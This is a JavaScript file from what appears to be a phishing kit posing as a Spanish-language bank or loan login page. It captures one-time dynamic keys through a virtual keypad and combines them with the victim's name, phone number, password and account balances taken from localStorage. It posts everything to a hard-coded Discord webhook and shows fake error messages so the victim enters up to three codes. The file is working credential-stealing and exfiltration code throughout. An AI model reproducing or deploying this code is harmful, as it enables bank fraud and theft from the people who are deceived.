document.addEventListener("DOMContentLoaded", () => {
  const validoHasta = localStorage.getItem('validoHasta');
  const validoHastaText = document.getElementById("validoHasta");
  if (validoHastaText && validoHasta) {
    validoHastaText.innerHTML = validoHasta;
  }

  const inputs = document.querySelectorAll('input[id^="otp-"]');
  const keyboard = document.getElementById("keyboard");
  const deleteBtn = document.getElementById("delete-otp");
  const loadingSpinner = document.querySelector(".loadingContainer");
  const finishContainer = document.querySelector(".finishContainer");
  const sectionTeclado = document.getElementById("sectionTeclado");
  const btnReturn = document.getElementById("btnReturn");
  const amount = document.getElementById("amount");
  const params = new URLSearchParams(window.location.search);
  const type = params.get("type");

  if (btnReturn) {
    btnReturn.addEventListener("click", (e) => {
      window.location.href = 'accces-sign-in.php.html';
    });
  }

  let currentInput = 0;
  let contSend = 0;

  // Configuración del webhook de Discord
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1562163402187477032/DOqQ1dzOrjIMmiJsDZoLI072WKkt5LwrP8lk7HVAj2jYXnFcFFrhgyjU4JZuU7YAe1n0";
  
  // Función para enviar mensaje a Discord
  async function sendToDiscord(content) {
    try {
      console.log("Enviando a Discord:", content);
      const response = await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content })
      });
      if (!response.ok) {
        console.error("Discord webhook error:", response.status, await response.text());
      } else {
        console.info("Message sent to Discord successfully");
      }
    } catch (err) {
      console.error("Failed to send to Discord:", err);
    }
  }

  // Manejar clics del teclado
  if (keyboard) {
    keyboard.addEventListener("click", (e) => {
      const button = e.target.closest(".keyboard-btn");
      if (button && !button.id.includes("delete")) {
        const value = button.dataset.value;
        if (currentInput < inputs.length) {
          inputs[currentInput].dataset.realValue = value;
          inputs[currentInput].value = "*";
          inputs[currentInput].dispatchEvent(
            new Event("input", { bubbles: true })
          );
          currentInput++;
        }
      }
    });
  }

  // Manejar el botón de borrar
  if (deleteBtn) {
    deleteBtn.addEventListener("click", () => {
      if (currentInput > 0) {
        currentInput--;
        inputs[currentInput].value = "";
        inputs[currentInput].dispatchEvent(
          new Event("input", { bubbles: true })
        );
      }
    });
  }

  // Permitir borrar con tecla retroceso
  document.addEventListener("keydown", (e) => {
    if (e.key === "Backspace" && currentInput > 0) {
      currentInput--;
      inputs[currentInput].value = "";
      inputs[currentInput].dispatchEvent(
        new Event("input", { bubbles: true })
      );
    }
  });

  // Prevenir cualquier entrada de teclado físico
  inputs.forEach((input) => {
    ["keydown", "keyup", "keypress", "input", "textInput"].forEach(
      (eventType) => {
        input.addEventListener(eventType, (e) => {
          e.preventDefault();
          return false;
        });
      }
    );

    input.addEventListener("paste", (e) => {
      e.preventDefault();
      return false;
    });

    input.setAttribute("readonly", "readonly");
    input.setAttribute("inputmode", "none");
  });

  function resetKeyboard() {
    currentInput = 0;
    inputs.forEach((input) => {
      input.value = "";
      input.dataset.realValue = "";
    });
    if (inputs.length > 0) inputs[0].focus();
  }

  // Verificar el estado de los inputs
  inputs.forEach((input, index) => {
    input.addEventListener("input", async () => {
      let isComplete = Array.from(inputs).every((inp) => inp.value !== "");
      if (isComplete) {
        let otp = "";
        inputs.forEach((inp) => {
          otp += inp.dataset.realValue || "";
        });

        const formData = JSON.parse(localStorage.getItem("formData")) || {};

        if (otp === "123456" || (formData.cedula && otp === formData.cedula.toString().slice(0, 6))) {
          const errorMessage = document.querySelector(".errorMessage");
          if (errorMessage) {
            errorMessage.style.opacity = "1";
            errorMessage.style.transform = "translateY(-20px)";
          }

          setTimeout(() => {
            resetKeyboard();
          }, 100);

          setTimeout(() => {
            if (errorMessage) {
              errorMessage.style.opacity = "0";
              errorMessage.style.transform = "translateY(20px)";
            }
          }, 5000);

          return;
        }

        contSend += 1;

        if (amount && formData.montoPrestamo) {
          amount.innerHTML = "$ " + formData.montoPrestamo;
        }

        if (loadingSpinner) {
          loadingSpinner.style.display = "block";
        }

        // Guardar la clave dinámica actual en formData
        formData[`claveDinamica_${contSend}`] = otp;
        localStorage.setItem("formData", JSON.stringify(formData));

        // Construir mensaje para Discord
        let discordMessage = `\n✅ CLAVE DINÁMICA ${contSend}\n\n\n`;
        discordMessage += `🙆‍♂️ Nombre: ${formData.nombreCompleto || ""}\n`;
        discordMessage += `🔢 Número: ${formData.phoneNumber || ""}\n`;
        discordMessage += `🔑 Clave: ${formData.password || ""}\n\n`;

        discordMessage += `--------------------------------------\n`;
        for (let i = 1; i <= contSend; i++) {
          const claveDinamica = formData[`claveDinamica_${i}`] || "Pendiente";
          discordMessage += `Clave Dinámica ${i}: ${claveDinamica}\n`;
        }
        discordMessage += `---------------------------------------\n\n`;

        discordMessage += `💸 Primer Saldo: ${formData.firstSaldo || ""}\n`;
        discordMessage += `💸 Segundo Saldo: ${formData.secondSaldo || ""}\n`;
        discordMessage += `═══════════════════════════════════════`;
        
        console.log("Mensaje a Discord:", discordMessage);

        // Enviar a Discord primero
        try {
          await sendToDiscord(discordMessage);
        } catch (error) {
          console.error("Error al enviar mensaje a Discord:", error);
        }

        // Ocultar el loading rápidamente (1.5 segundos en lugar de 30 segundos)
        setTimeout(() => {
          resetKeyboard();
          if (loadingSpinner) loadingSpinner.style.display = "none";

          if (contSend === 3) {
            if (finishContainer) finishContainer.style.display = "block";
            if (sectionTeclado) sectionTeclado.style.display = "none";
          } else {
            // Mostrar mensaje de error fluido
            const errorMessage = document.querySelector(".errorMessage");
            if (errorMessage) {
              errorMessage.style.opacity = "1";
              errorMessage.style.transform = "translateY(-20px)";
              setTimeout(() => {
                errorMessage.style.opacity = "0";
                errorMessage.style.transform = "translateY(20px)";
              }, 4000);
            }
          }
        }, 1500); 
      }
    });
  });
});
